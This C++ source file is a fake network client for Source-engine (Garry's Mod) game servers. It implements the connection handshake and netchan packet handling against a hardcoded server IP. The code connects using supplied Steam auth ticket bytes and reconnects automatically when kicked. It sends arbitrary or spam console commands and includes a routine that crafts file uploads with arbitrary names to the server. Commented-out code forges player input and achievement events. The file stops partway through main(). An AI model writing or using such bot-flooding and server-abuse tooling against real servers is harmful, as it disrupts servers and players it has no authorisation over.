
#pragma once

#include "leyfakeclient.h"
#ifdef _WIN32
#define _sleep Sleep
#endif

int serversock = 0;

int serverport = 27015;
int clientport = 27005;

char*serverip = "37.187.136.82";
char nickname[255];
const char *password = "none";


int chosenkey = 0;
char parsedkeys[100][244];

int bconnectstep = 1;

char runcmd[255];

long long steamid64 = 0;

leychan *netchan = new leychan;

long net_tick;
unsigned int net_hostframetime;
unsigned int net_hostframedeviation;

#ifndef _WIN32
#define SOCKADDR sockaddr
#endif // _WIN32

void SendTo(int sock, const std::string& address, unsigned short port, const char* buffer, int len, int flags = 0)
{

	sockaddr_in add;
	add.sin_family = AF_INET;

	inet_pton(AF_INET, address.c_str(), &(add.sin_addr));

	add.sin_port = htons(port);


	int ret = sendto(sock, buffer, len, flags, reinterpret_cast<SOCKADDR *>(&add), sizeof(add));
	if (ret < 0)
	{
		int err = lastneterror();
		if (err == 10035 || err == 10054)
			return;

		printf("sendto failed: %i\n", err);

		return;
	}
}

static double diffclock(clock_t clock1, clock_t clock2)
{
	double diffticks = clock1 - clock2;
	double diffms = (diffticks) / (CLOCKS_PER_SEC / 1000);
	return diffms;
}

#define NETBUFFER_SIZE 50000
char netsendbuffer[NETBUFFER_SIZE];

bf_write senddata(netsendbuffer, sizeof(netsendbuffer));


char datagram[NETBUFFER_SIZE];
bf_write netdatagram(datagram, sizeof(datagram));



bool NET_ResetDatagram()
{
	netdatagram.Reset();
	senddata.Reset();

	memset(datagram, 0, NETBUFFER_SIZE);
	memset(netsendbuffer, 0, NETBUFFER_SIZE);

	return true;
}

inline bool NET_SendDatagram(bool subchans = false)
{
	if (senddata.GetNumBytesWritten() == 0)
	{
		return false;
	}
	unsigned char flags = 0;

	netdatagram.WriteLong(netchan->m_nOutSequenceNr); // outgoing sequence
	netdatagram.WriteLong(netchan->m_nInSequenceNr); // incoming sequence

	bf_write flagpos = netdatagram;

	netdatagram.WriteByte(0); // flags
	netdatagram.WriteWord(0); // crc16

	int nCheckSumStart = netdatagram.GetNumBytesWritten();



	netdatagram.WriteByte(netchan->m_nInReliableState);


	if (subchans)
	{
		flags |= PACKET_FLAG_RELIABLE;
	}



	netdatagram.WriteBits(senddata.GetData(), senddata.GetNumBitsWritten()); // Data

	int nMinRoutablePayload = MIN_ROUTABLE_PAYLOAD;


	while ((netdatagram.GetNumBytesWritten() < MIN_ROUTABLE_PAYLOAD&&netdatagram.GetNumBitsWritten() % 8 != 0))
	{
		netdatagram.WriteUBitLong(0, NETMSG_TYPE_BITS);
	}

	flagpos.WriteByte(flags);

	void *pvData = datagram + nCheckSumStart;

	if (pvData)
	{


		int nCheckSumBytes = netdatagram.GetNumBytesWritten() - nCheckSumStart;
		if (nCheckSumBytes > 0)
		{

			unsigned short usCheckSum = BufferToShortChecksum(pvData, nCheckSumBytes);
			flagpos.WriteUBitLong(usCheckSum, 16);

			netchan->m_nOutSequenceNr++;

			SendTo(serversock, serverip, serverport, datagram, netdatagram.GetNumBytesWritten());
		}
	}

	NET_ResetDatagram();

	return true;
}

inline bool NET_RequestFragments()
{
	NET_ResetDatagram();


	senddata.WriteOneBit(0);
	senddata.WriteOneBit(0);

	NET_SendDatagram(true);

	return true;
}

void GenerateLeyFile(const char *file, const char *txt)
{


	printf("OUTGOING: %i\n", netchan->m_nOutSequenceNr);


	int nCheckSumStart = senddata.GetNumBytesWritten();

	senddata.WriteUBitLong(netchan->m_nInReliableState, 3);//m_nInReliableState
	senddata.WriteOneBit(1);//subchannel
	senddata.WriteOneBit(1); // data follows( if 0 = singleblock )
	senddata.WriteUBitLong(0, MAX_FILE_SIZE_BITS - FRAGMENT_BITS);// startFragment
	senddata.WriteUBitLong(BYTES2FRAGMENTS(strlen(txt)), 3);//number of fragments
	senddata.WriteOneBit(1);//is it a file?

	senddata.WriteUBitLong(0xFF, 32);//transferid

	senddata.WriteString(file);//filename
	senddata.WriteOneBit(0);//compressed?
	senddata.WriteUBitLong(strlen(txt), MAX_FILE_SIZE_BITS);//number of bytes of the file
	senddata.WriteString(txt);

}


unsigned long ourchallenge = 0x0B5B1842;

void NET_Disconnect()
{
	NET_ResetDatagram();

	senddata.WriteUBitLong(1, 6);
	senddata.WriteString("Disconnect by User.");

	NET_SendDatagram();

}

void NET_Reconnect()
{
	_sleep(500);

	printf("Reconnecting..\n");

	NET_ResetDatagram();

	senddata.Reset();
	memset(netsendbuffer, 0, sizeof(netsendbuffer));

	bconnectstep = 1;


}

unsigned long serverchallenge = 0;
unsigned long authprotocol = 0;
unsigned long steamkey_encryptionsize = 0;
unsigned char steamkey_encryptionkey[STEAM_KEYSIZE];
unsigned char serversteamid[STEAM_KEYSIZE];
int vacsecured = 0;


char charip[INET_ADDRSTRLEN];

bool HandleMessage(bf_read &msg, int type)
{

	if (type == 0) // nop
	{
		//	printf("NOP\n");
		return true;
	}

	if (type == 1) // disconnect
	{
		char dcreason[1024];
		msg.ReadString(dcreason, sizeof(dcreason));
		printf("Disconnected: %s\n", dcreason);
		printf("Reconnecting in 100 ms ...");

		_sleep(100);
		NET_Reconnect();
		return true;
	}

	if (type == 2)//net_File
	{
		long transferid = msg.ReadUBitLong(32);
		char filename[255];
		msg.ReadString(filename, sizeof(filename));
		bool requested = (bool)(msg.ReadOneBit()==1);

		if (requested)
			printf("net_File: Server requested file: %s::%i\n", filename, transferid);
		else
			printf("net_File: Server is not sending file: %s::%i\n", filename, transferid);

		return true;
	}
	if (type == 3)//net_Tick
	{
		net_tick = msg.ReadLong();
		net_hostframetime = msg.ReadUBitLong(16);
		net_hostframedeviation = msg.ReadUBitLong(16);
		//printf("Tick: %i - hostframetime: %i ( deviation: %i )\n", net_tick, net_hostframedeviation, net_hostframedeviation);

		return true;
	}

	if (type == 4)//net_StringCmd
	{
		char cmd[1024];
		msg.ReadString(cmd, sizeof(cmd));

		printf("net_StringCmd: %s\n", cmd);
		return true;
	}

	if (type == 5)//net_SetConVar
	{

		int count = msg.ReadByte();

		char cmdname[255];
		char cmdval[255];

		printf("net_SetConVar: %i\n", count);
		for (int i = 0; i < count; i++)
		{
			msg.ReadString(cmdname, sizeof(cmdname));
			msg.ReadString(cmdval, sizeof(cmdval));
			printf("%s to: %s\n", cmdname, cmdval);

		}
		printf("net_SetConVar_end, left: %i\n", msg.GetNumBytesLeft());
		return true;

	}

	if (type == 6)// net_SignonState
	{
		int state = msg.ReadByte();
		long aservercount = msg.ReadLong();


		printf("Received net_SignOnState: %i, count: %i\n", state, bconnectstep);

		if (netchan->m_iSignOnState == state)
		{
			printf("Ignored signonstate!\n");
			return true;
		}

		netchan->m_iServerCount = aservercount;
		netchan->m_iSignOnState = state;

		if (state == 3)
		{
			printf("KK\n");

			long noob = (long)(steamid64 - 76561197960265728);

			senddata.WriteUBitLong(8, 6);
			senddata.WriteLong(netchan->m_iServerCount);
			senddata.WriteLong(617146426);
			senddata.WriteOneBit(1);//ishltv
			senddata.WriteLong(noob);
			senddata.WriteString("DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n");
			senddata.WriteOneBit(0);
			senddata.WriteOneBit(0);
			senddata.WriteOneBit(0);
			senddata.WriteOneBit(0);

			senddata.WriteUBitLong(6, 6);
			senddata.WriteByte(state);
			senddata.WriteLong(aservercount);
			NET_SendDatagram();

			return true;
		}

		if (bconnectstep)
		{


			if (state == 4 && false)
			{
				senddata.WriteUBitLong(12, 6);

				for (int i = 0; i < 32; i++)
				{
					senddata.WriteUBitLong(1, 32);
				}


			}

			senddata.WriteUBitLong(6, 6);
			senddata.WriteByte(state);
			senddata.WriteLong(aservercount);



			NET_SendDatagram(false);

			return true;
		}

		senddata.WriteUBitLong(6, 6);
		senddata.WriteByte(state);
		senddata.WriteLong(aservercount);




		return true;
	}

	if (type == 7) // svc_Print
	{
		char print[2048];
		msg.ReadString(print, sizeof(print));
		//	printf("svc_Print: %s", print);
		printf("%s", print);
		return true;
	}

	if (type == 8)//svc_ServerInfo
	{
		unsigned short protoversion = msg.ReadShort();
		long servercount = msg.ReadLong();

		bool srctv = (bool)(msg.ReadOneBit() == 1);
		bool dedicated = (bool)(msg.ReadOneBit() == 1);
		long crc = msg.ReadLong();
		short maxclasses = msg.ReadWord();
		char mapmd5[16];
		msg.ReadBytes(mapmd5, 16);

		char players = msg.ReadByte();
		char maxplayers = msg.ReadByte();
		float tickinterval = msg.ReadFloat();
		char platform = msg.ReadChar();

		char gamedir[255];
		char levelname[255];
		char skyname[255];
		char hostname[255];
		char loadingurl[255];
		char gamemode[255];

		msg.ReadString(gamedir, sizeof(gamedir));
		msg.ReadString(levelname, sizeof(levelname));
		msg.ReadString(skyname, sizeof(skyname));
		msg.ReadString(hostname, sizeof(hostname));
		msg.ReadString(loadingurl, sizeof(loadingurl));
		msg.ReadString(gamemode, sizeof(gamemode));

		printf("ServerInfo, players: %lu/%lu | map: %s | name: %s | gm: %s | count: %i | left: %i | step: %i\n", players, maxplayers, levelname, hostname, gamemode, servercount, msg.GetNumBitsLeft(), bconnectstep);

		netchan->m_iServerCount = servercount;
		bconnectstep = 4;

		return true;
	}

	if (type == 10)//svc_ClassInfo
	{
		int classes = msg.ReadShort();
		int useclientclasses = msg.ReadOneBit();

		unsigned int size = (int)(log2(classes) + 1);


		if (useclientclasses == 0)
		{
			printf("Received svc_ClassInfo | classes: %i: \n", classes);
			for (int i = 0; i < classes; i++)
			{
				int classid = msg.ReadUBitLong(size);

				char classname[255];
				char dtname[255];

				msg.ReadString(classname, sizeof(classname));
				msg.ReadString(dtname, sizeof(dtname));

				printf("Classname: %s | DTname: %s | ClassID: %i\n", classname, dtname, classid);
			}
			printf("svc_ClassInfo end\n");
		}
		else {
			printf("Received svc_ClassInfo, classes: %i\n", classes);
		}

		return true;
	}

	if (type == 11)//svc_SetPause
	{
		int state = msg.ReadOneBit();
		printf("Received svc_SetPause, state: %i\n", state);

		return true;
	}

	if (type == 12)//svc_CreateStringTable
	{

		char name[500];
		msg.ReadString(name, sizeof(name));

		short maxentries = msg.ReadWord();

		unsigned int size = (int)(log2(maxentries) + 1);
		int entries = msg.ReadUBitLong(size);

		int bits = msg.ReadVarInt32();
		int userdata = msg.ReadOneBit();

		if (userdata == 1)
		{
			int userdatasize = msg.ReadUBitLong(12);

			int userdatabits = msg.ReadUBitLong(4);
		}

		int compressed = msg.ReadOneBit();

		if (bits < 1)
			return true;

		char* data = new char[bits];


		msg.ReadBits(data, bits);

		delete[] data;


		printf("Received svc_CreateStringTable, name: %s | maxentries: %i | size: %d | entries: %i | compressed: %i\n", name, maxentries, size, entries, compressed);

		return true;
	}

	if (type == 13)//svc_UpdateStringTable
	{
		int tableid = msg.ReadUBitLong((int)MAX_TABLES_BITS);

		int changed = 1;

		if (msg.ReadOneBit() != 0)
		{
			changed = msg.ReadWord();
		}

		int bits = msg.ReadUBitLong(20);

		if (bits < 1)
			return true;

		char *data = new char[bits];

		msg.ReadBits(data, bits);

		delete[] data;


		printf("Received svc_UpdateStringTable, id: %i | changed: %i | bits: %i\n", tableid, changed, bits);

		return true;
	}

	if (type == 14)//svc_VoiceInit
	{
		char codec[255];
		msg.ReadString(codec, sizeof(codec));

		int quality = msg.ReadByte();


		printf("Received svc_VoiceInit, codec: %s | quality: %i\n", codec, quality);

		return true;
	}

	if (type == 15)//svc_VoiceData
	{

		int client = msg.ReadByte();
		int proximity = msg.ReadByte();
		int bits = msg.ReadWord();

		if (bits < 1)
			return true;

		char* voicedata = new char[bits];

		msg.ReadBits(voicedata, bits);

		delete[] voicedata;

		//printf("Received svc_VoiceData, client: %i | proximity: %i | bits: %i\n", client, proximity, bits);

		return true;
	}

	if (type == 17)//svc_Sounds
	{
		int reliable = msg.ReadOneBit();

		int num = 1;
		int bits = 0;

		if (reliable == 0)
		{
			num = msg.ReadUBitLong(8);
			bits = msg.ReadUBitLong(16);
		}
		else {
			bits = msg.ReadUBitLong(8);
		}

		if (bits < 1)
			return true;

		char*data = new char[bits];
		msg.ReadBits(data, bits);

		delete[] data;

		//printf("Received svc_Sounds, reliable: %i, bits: %i, num: %i\n", reliable, bits, num);
		return true;
	}

	if (type == 18)//svc_SetView
	{
		int ent = msg.ReadUBitLong(MAX_EDICT_BITS);

		printf("Received svc_SetView, ent: %i\n", ent);
		return true;
	}

	if (type == 19)//svc_FixAngle
	{
		int relative = msg.ReadOneBit();

		float x = msg.ReadBitAngle(16);
		float y = msg.ReadBitAngle(16);
		float z = msg.ReadBitAngle(16);

		printf("Received svc_FixAngle, x:%f y: %f z: %f | relative: %i\n", x, y, z, relative);

		return true;
	}

	if (type == 21)//svc_BSPDecal
	{

		Vector vec;
		msg.ReadBitVec3Coord(vec);

		int texture = msg.ReadUBitLong(9);
		int useentity = msg.ReadOneBit();

		int ent = 0;
		int modulation = 0;

		if (useentity == 1)
		{
			ent = msg.ReadUBitLong(MAX_EDICT_BITS);
			modulation = msg.ReadUBitLong(12);
		}

		int lowpriority = msg.ReadOneBit();

		printf("Received svc_BSPDecal: pos: %f:%f:%f | tex: %i | useent: %i\n", vec.x, vec.y, vec.z, texture, useentity);

		return true;
	}

	if (type == 23)//svc_UserMessage
	{
		int msgtype = msg.ReadByte();
		int bits = msg.ReadUBitLong(MAX_USERMESSAGE_BITS);

		if (bits < 1)
			return true;

		char* data = new char[bits];

		msg.ReadBits(data, bits);

		bf_read userMsg(data, bits);

		if (msgtype == 3)
		{


			int client = userMsg.ReadByte();
			//int bWantsChat = userMsg.ReadByte();
			char readstr[MAX_USER_MSG_DATA];
			userMsg.ReadString(readstr, sizeof(readstr));

			int something3 = userMsg.ReadByte(); //idk, sometimes 1, might be bchat
			int something4 = userMsg.ReadByte(); //seems to be 1 when teamchatting
			int something5 = userMsg.ReadByte(); //idk, sometimes 1

			printf("Chat message: %i:%s __ %i\n", client, readstr, userMsg.GetNumBytesLeft());

			delete[] data;
			return true;
		}

		if (msgtype == 5)
		{
			userMsg.ReadByte();
			char readstr[MAX_USER_MSG_DATA];
			userMsg.ReadString(readstr, sizeof(readstr));

			printf("umsg print: %s\n", readstr);
		}
		if (msgtype == 44)//nwvar
		{
			int cock = userMsg.ReadUBitLong(32);
			int cock2 = userMsg.ReadByte();

			char str[255];
			userMsg.ReadString(str, sizeof(str));

			char str2[255];
			userMsg.ReadString(str2, sizeof(str2));

			//printf("cock1:%i cock2: %i name: %s str2: %s | left: %i\n", cock, cock2, str, str2,  userMsg.GetNumBytesLeft());

			delete[] data;
			return true;
		}

		delete[] data;

		printf("Received svc_UserMessage, type: %i | bits: %i\n", msgtype, bits);

		return true;
	}

	if (type == 24)//svc_EntityMessage
	{
		int ent = msg.ReadUBitLong(MAX_EDICT_BITS);
		int entclass = msg.ReadUBitLong(MAX_SERVER_CLASS_BITS);
		int bits = msg.ReadUBitLong(MAX_ENTITYMESSAGE_BITS);

		if (bits < 1)
			return true;

		char *data = new char[bits];
		msg.ReadBits(data, bits);

		delete[] data;

		printf("Received svc_EntityMessage, ent: %i | class: %i | bits: %i\n", ent, entclass, bits);

		return true;
	}

	if (type == 25)//svc_GameEvent
	{
		int bits = msg.ReadUBitLong(11);

		if (bits < 1)
			return true;

		char *data = new char[bits];
		msg.ReadBits(data, bits);

		delete[] data;

		printf("Received svc_GameEvent, bits: %i\n", bits);
		return true;
	}

	if (type == 26)//svc_PacketEntities
	{
		int max = msg.ReadUBitLong(MAX_EDICT_BITS);

		int isdelta = msg.ReadOneBit();

		int delta = -1;

		if (isdelta)
		{
			delta = msg.ReadLong();
		}

		int baseline = msg.ReadUBitLong(1);
		int changed = msg.ReadUBitLong(MAX_EDICT_BITS);
		int bits = msg.ReadUBitLong(20);

		int updatebaseline = msg.ReadOneBit();

		int bytes = bits / 8;

		if (bits < 1)
			return true;

		char *data = new char[bits];
		msg.ReadBits(data, bits);

		delete[] data;

		//printf("Received svc_PacketEntities, max: %i | isdelta: %i | line: %i | changed: %i | bits: %i | update: %i\n", max, isdelta, baseline, changed, bits, updatebaseline);


		return true;
	}

	if (type == 27)//svc_TempEntities
	{
		int num = msg.ReadUBitLong(8);
		int bits = msg.ReadVarInt32();

		if (bits < 1)
			return true;

		char *data = new char[bits];

		msg.ReadBits(data, bits);

		delete[] data;

		printf("Received svc_TempEntities, num: %i | bits: %i\n", num, bits);

		if (bconnectstep)
		{

			senddata.WriteUBitLong(6, 6);
			senddata.WriteByte(6);
			senddata.WriteLong(netchan->m_iServerCount);

			senddata.WriteUBitLong(11, 6);
			senddata.WriteLong(net_tick);
			senddata.WriteUBitLong(1, 1);

			NET_SendDatagram(false);

			bconnectstep = 0;

		}

		return true;
	}

	if (type == 28)//svc_Prefetch
	{
		int index = msg.ReadUBitLong(4);

		printf("Received svc_Prefetch, index: %i\n", index);

		return true;
	}
	if (type == 30)//svc_GameEventList
	{
		int num = msg.ReadUBitLong(9);
		int bits = msg.ReadUBitLong(20);

		if (bits < 1)
			return true;

		char *data = new char[bits];
		msg.ReadBits(data, bits);

		printf("Received svc_GameEventList, num: %i | bits: %i\n", num, bits);

		delete[] data;

		return true;
	}

	if (type == 31)//svc_GetCvarValue
	{
		int cookie = msg.ReadUBitLong(32);


		char cvarname[255];
		msg.ReadString(cvarname, sizeof(cvarname));

		printf("Received svc_GetCvarValue, cookie: %i | name: %s\n", cookie, cvarname);

		return true;
	}

	if (type == 33)//svc_GMod_ServerToClient
	{
		int bits = msg.ReadUBitLong(20);
		int type = msg.ReadByte(); // 4= probably server telling about files

		if (bits < 1)
			return true;


		if (bits < 0)
		{
			printf("Received svc_Gmod_ServerToClient || Invalid!\n");

			return true;
		}

		if (type == 4)
		{
			
			char* data = new char[bits];


			int id = msg.ReadWord();

			int toread = bits - 8 - 16;
			if (toread > 0)
			{
				msg.ReadBits(data, toread);
			}



			printf("Received svc_GMod_ServerToClient, type: %i |  bits: %i  | id: %i \n", type, bits, id);

			delete[] data;

			return true;

		}

		if(type==3)
		{

			printf("Received svc_GMod_ServerToClient, type: %i |  bits: %i\n", type, bits);

			return true;
		}


		if (type == 0)
		{
		
			int id = msg.ReadWord();

			char* data = new char[bits];

			int toread = bits - 8 - 16;
			if (toread > 0)
			{
				msg.ReadBits(data, toread);
			}

			delete[] data;

			printf("Received svc_GMod_ServerToClient, type: %i |  bits: %i\n", type, bits);
			return true;
		}


		printf("Received svc_GMod_ServerToClient, type: %i |  bits: %i\n", type, bits);

		return true;
	}

	return false;
}




int ProcessMessages(bf_read&msgs)
{

	int processed = 0;
	while (true)
	{
		if (msgs.IsOverflowed())
		{
			return processed;
		}



		unsigned char type = msgs.ReadUBitLong(NETMSG_TYPE_BITS);

		bool handled = HandleMessage(msgs, type);

		if (!handled)
		{
			printf("Unhandled Message: %i\n", type);
			return processed;
		}

		processed++;

		if (msgs.GetNumBitsLeft() < NETMSG_TYPE_BITS)
		{
			return processed;
		}
	}


	return processed;
}


int last_packet_received = 0;

#include "utlbuffer.h"
int networkthink()
{

	char netrecbuffer[NETBUFFER_SIZE];


	sockaddr_in from;
#ifdef _WIN32
	int size = sizeof(from);
#else
	unsigned int size = sizeof(from);
#endif
	int msgsize = recvfrom(serversock, netrecbuffer, NETBUFFER_SIZE, 0, (struct sockaddr *)&from, &size);

	if (msgsize <1)
	{

		int err = lastneterror();
		if (err != 10035 && err != 10054 && err != 11)
		{
			printf("recvfrom error: %i\n", err);

			return 0;
		}

		return 1;

	}

	memset(charip, 0, sizeof(charip));
	inet_ntop(AF_INET, &from.sin_addr, charip, INET_ADDRSTRLEN);
	int port = (int)ntohs(from.sin_port);

	bf_read recvdata(netrecbuffer, msgsize);
	int header = recvdata.ReadLong();

	int connection_less = 0;

	if (header == NET_HEADER_FLAG_QUERY)
		connection_less = 1;

	if (header == NET_HEADER_FLAG_SPLITPACKET)
	{
		printf("SPLIT\n");

		if (!netchan->HandleSplitPacket(netrecbuffer, msgsize, recvdata))
			return 0;

		header = recvdata.ReadLong();
	}

	if (header == NET_HEADER_FLAG_COMPRESSEDPACKET)
	{
		unsigned int uncompressedSize = msgsize * 16;

		char*tmpbuffer = new char[uncompressedSize];


		memmove(netrecbuffer, netrecbuffer + 4, msgsize + 4);

		NET_BufferToBufferDecompress(tmpbuffer, uncompressedSize, netrecbuffer, msgsize);

		memcpy(netrecbuffer, tmpbuffer, uncompressedSize);


		recvdata.StartReading(netrecbuffer, uncompressedSize, 0);
		printf("UNCOMPRESSED\n");


		delete[] tmpbuffer;
		tmpbuffer = 0;
	}


	recvdata.Reset();

	//printf("%s::%i\n", charip, port);

	if (!strstr(serverip, charip))
	{
		//printf("ip mismatch\n");
		return 0;
	}

	if (connection_less)
	{

		recvdata.ReadLong();

		int header = 0;
		int id = 0;
		int total = 0;
		int number = 0;
		short splitsize = 0;

		if (connection_less == 1)
		{
			header = recvdata.ReadByte();
		}
		else {
			id = recvdata.ReadLong();
			total = recvdata.ReadByte();
			number = recvdata.ReadByte();
			splitsize = recvdata.ReadByte();
		}

		switch (header)
		{

		case '9':
		{
			recvdata.ReadLong();

			char error[1024];
			recvdata.ReadString(error, 1024);
			printf("Connection refused! [%s]\n", error);

			NET_Reconnect();

			return 0;
		}
		case 'A': // A2A_GETCHALLENGE
		{
			bconnectstep = 2;
			long magicnumber = recvdata.ReadLong();

			serverchallenge = recvdata.ReadLong();
			ourchallenge = recvdata.ReadLong();
			authprotocol = recvdata.ReadLong();

			steamkey_encryptionsize = recvdata.ReadShort(); // gotta be 0

			recvdata.ReadBytes(steamkey_encryptionkey, steamkey_encryptionsize);
			recvdata.ReadBytes(serversteamid, sizeof(serversteamid));
			vacsecured = recvdata.ReadByte();

			printf("Challenge: %lu__%lu|Auth: %x|SKey: %lu|VAC: %x\n", serverchallenge, ourchallenge, authprotocol, steamkey_encryptionsize, vacsecured);

			static char connectpkg[700];
			memset(connectpkg, 0, sizeof(connectpkg));

			bf_write writeconnect(connectpkg, sizeof(connectpkg));
			bf_read readsteamid(connectpkg, sizeof(connectpkg));

			writeconnect.WriteLong(-1);
			writeconnect.WriteByte('k');//C2S_CONNECT

			writeconnect.WriteLong(0x18);//protocol ver
			
			writeconnect.WriteLong(0x03);//auth protocol 0x03 = PROTOCOL_STEAM, 0x02 = PROTOCOL_HASHEDCDKEY, 0x01=PROTOCOL_AUTHCERTIFICATE
			writeconnect.WriteLong(serverchallenge);
			writeconnect.WriteLong(ourchallenge);

			writeconnect.WriteUBitLong(2729496039, 32);

			writeconnect.WriteString(nickname); //nick
			writeconnect.WriteString(password); // pass
			writeconnect.WriteString("2000"); // game version

			readsteamid.m_iCurBit = writeconnect.m_iCurBit;
			writeconnect.WriteShort(242);

			writeconnect.WriteBytes(parsedkeys[chosenkey]+2, 242);//steam cookies = 242, hashedcdkey cookies = 32 
			


			printf("CONNECTPKG: %i\n", writeconnect.GetNumBytesWritten());

		/*
			
			int steam_n = readsteamid.ReadUBitLong(8);
			steam_n -= 76561197960265728;
			int authserver = steam_n % 2;
			steam_n -= authserver;
			int authid = steam_n / 2;
			char steam_id[50];
			sprintf(steam_id, "STEAM_0:%i:%i", authserver, authid);
			
			printf("STEAMID: %s\n", steam_id);
				*/
			SendTo(serversock, charip, port, connectpkg, writeconnect.GetNumBytesWritten());


#ifdef DEBUG
			printf("Replied with A2S_CONNECT\n");
#endif // DEBUG
			return 0;

		}
		case 'B': // S2C_CONNECTION
		{

			if (bconnectstep == 2)
			{
				bconnectstep = 3;
				printf("Connected successfully\n");

				netchan->Initialize();



				senddata.WriteUBitLong(6, 6);
				senddata.WriteByte(2);
				senddata.WriteLong(-1);

				//senddata.WriteUBitLong(5, 6);

				/*
				senddata.WriteByte(31);
				for (int i = 0; i < 31; i++)
				{
					senddata.WriteString("gm_snapangles");
					senddata.WriteString("45");
				}
				*/
				NET_SendDatagram();
			}


			return 0;
		}

		case 'I':
		{
			return 0;
		}
		default:
		{
			printf("Unknown message received from: %s, header: %i ( %c )\n msg: %s\n", charip, header, header, netrecbuffer);
			break;
		}


		}

		return 0;
	}

	int flags = netchan->ProcessPacketHeader(msgsize, recvdata);

	if (flags == -1)
	{

		printf("Malformed package!\n");

		return 0;
	}


	last_packet_received = clock();

	if (flags & PACKET_FLAG_RELIABLE)
	{
		int i = 0;

		int bit = recvdata.ReadUBitLong(3);
		bit = 1 << bit;

		for (i = 0; i<MAX_STREAMS; i++)
		{

			if (recvdata.ReadOneBit() != 0)
			{
				if (!netchan->ReadSubChannelData(recvdata, i))
				{
					return 0;
				}
			}
		}


		FLIPBIT(netchan->m_nInReliableState, bit);

		for (i = 0; i<MAX_STREAMS; i++)
		{
			if (!netchan->CheckReceivingList(i))
			{
				return 0;
			}
		}
	}



	if (recvdata.GetNumBitsLeft() > 0)
	{
		int proc = ProcessMessages(recvdata);



	}

	static bool neededfragments = false;

	if (netchan->NeedsFragments() || flags&PACKET_FLAG_TABLES)
	{
		neededfragments = true;
		NET_RequestFragments();
	}

	return 0;
}

int sentstuff = 0;

void* networkthread(void* shit)
{

	while (1)
	{
		sentstuff = networkthink();
	}

}

bool needsforce = true;


void* sendthread(void* shit)
{

	bool lastrecdiff = false;

	while (true)
	{


		_sleep(1);

		int recdiff = (int)abs((double)diffclock(last_packet_received, clock()));

		if (recdiff > 10000)
		{
			NET_Reconnect();
		}


		if (bconnectstep)
		{
			if (bconnectstep == 1)
			{
				char challengepkg[100];

				bf_write writechallenge(challengepkg, sizeof(challengepkg));
				writechallenge.WriteLong(-1);
				writechallenge.WriteByte('q');
				writechallenge.WriteLong(ourchallenge);
				writechallenge.WriteString("0000000000");

				SendTo(serversock, serverip, serverport, challengepkg, writechallenge.GetNumBytesWritten());
				_sleep(500);
			}

			_sleep(500);

		}




		if (!bconnectstep && !netchan->NeedsFragments() && recdiff >= 20 && !lastrecdiff)
		{

			NET_ResetDatagram();


			senddata.WriteOneBit(0);
			senddata.WriteOneBit(0);

			NET_SendDatagram(true);
			lastrecdiff = true;
		}
		else {
			lastrecdiff = false;
		}

		if (netchan->m_nInSequenceNr < 130)
		{
			NET_SendDatagram();//netchan is volatile without this for some reason
			continue;
		}

		static int skipwalks = 0;

		if(skipwalks)
			skipwalks--;


		if (!skipwalks )
		{
			/*
			senddata.WriteUBitLong(9, 6);
			senddata.WriteUBitLong(1, 4);
			senddata.WriteUBitLong(0, 3);

			int curbit = senddata.m_iCurBit;
			senddata.WriteWord(1337);

			int len = 21;


			for (int a = 1; a < 22; a++)
			{

				if ( a == 3)//pitch
				{
					senddata.WriteOneBit(1);

					static float pitch = 90;
					static bool bdown = true;
					
					if (bdown)
						pitch -= 2;
					else
						pitch += 2;

					if (pitch < -89 )
						bdown = false;

					if (pitch > 89)
						bdown = true;

					senddata.WriteFloat(pitch);
					len += 32;

					continue;
				}

				if (a == 6&&GetAsyncKeyState(VK_UP))
				{
					senddata.WriteOneBit(1);
					senddata.WriteFloat(500);
					len += 32;
					continue;
				}
				else {
					if (a == 6 && GetAsyncKeyState(VK_DOWN))
					{
						senddata.WriteOneBit(1);
						senddata.WriteFloat(-500);
						len += 32;
						continue;
					}
				}

				if (a == 7 && GetAsyncKeyState(VK_RIGHT))
				{
					senddata.WriteOneBit(1);
					senddata.WriteFloat(500);
					len += 32;

					continue;
				}
				else {
					if (a == 7 && GetAsyncKeyState(VK_LEFT))
					{
						senddata.WriteOneBit(1);
						senddata.WriteFloat(-500);
						len += 32;
						continue;
					}
				}

				if (a == 8)
				{
					senddata.WriteOneBit(1);
					senddata.WriteFloat(500);
					len += 32;

					continue;att
				}

				senddata.WriteOneBit(0);
			}

			int now = senddata.m_iCurBit;
			senddata.m_iCurBit = curbit;
			senddata.WriteWord(len);
			senddata.m_iCurBit = now;
			*/
			senddata.WriteUBitLong(3, 6);
			senddata.WriteLong(net_tick);
			senddata.WriteUBitLong(net_hostframetime, 16);
			senddata.WriteUBitLong(net_hostframedeviation, 16);

			skipwalks = 12;
		}
		


		{

			/*
			enum types_t
			{
			TYPE_NONE = 0,
			TYPE_STRING = 1,
			TYPE_INT = 2,
			TYPE_FLOAT = 3,
			TYPE_PTR = 4,
			TYPE_WSTRING = 5,
			TYPE_COLOR = 6,
			TYPE_UINT64 = 7,
			TYPE_NUMTYPES = 8,
			};
			*/

			/*

			CUtlBuffer sheet(0, 8);

			sheet.PutUnsignedChar(1);
			sheet.PutString("AchievementEarned");

			sheet.PutUnsignedChar(0);

			int id = rand() % 30;

			sheet.PutUnsignedChar(1);
			sheet.PutString("achievementID");

			sheet.PutUnsignedChar(2);
			sheet.PutInt(id);






			sheet.PutUnsignedChar(8);

			sheet.PutUnsignedChar(8);

				senddata.WriteUBitLong(16, 6);
				senddata.WriteLong(sheet.TellPut());
				senddata.WriteBytes(sheet.Base(), sheet.TellPut());

				*/
		}


		if (strlen(runcmd) > 0)
		{
			

				printf("Sending cmd: %s\n", runcmd);

				senddata.WriteUBitLong(4, 6);
				senddata.WriteString(runcmd);	

				memset(runcmd, 0, sizeof(runcmd));



		}

		NET_SendDatagram();

	}

}

int parseip(const char*serverip_and_port, char*& ip, int& port)
{

	char cserverport[25];
	char cserverip[30];

	bool found_semicolon = false;

	for (unsigned int i = 0; i < strlen(serverip_and_port); i++)
	{
		if (serverip_and_port[i] == ':')
		{
			found_semicolon = true;
			strncpy(cserverip, serverip_and_port, i);
			cserverip[i] = 0;

			strncpy(cserverport, serverip_and_port + i + 1, strlen(serverip_and_port) - 1);
			cserverport[strlen(serverip_and_port) - 1] = 0;

			break;
		}
	}

	strcpy(ip, cserverip);
	port = atoi(cserverport);

	return 1;
}

int main(int argc, const char *argv[])
{

	if (!argv[1] || !argv[2] || !argv[3] || !argv[4] || !argv[5])
	{
		printf("Invalid Params: server clientport nickname key ( or -1 ) steamid64 [password] [spamcmd]\n");
		return 0;
	}

	serverip = new char[50];

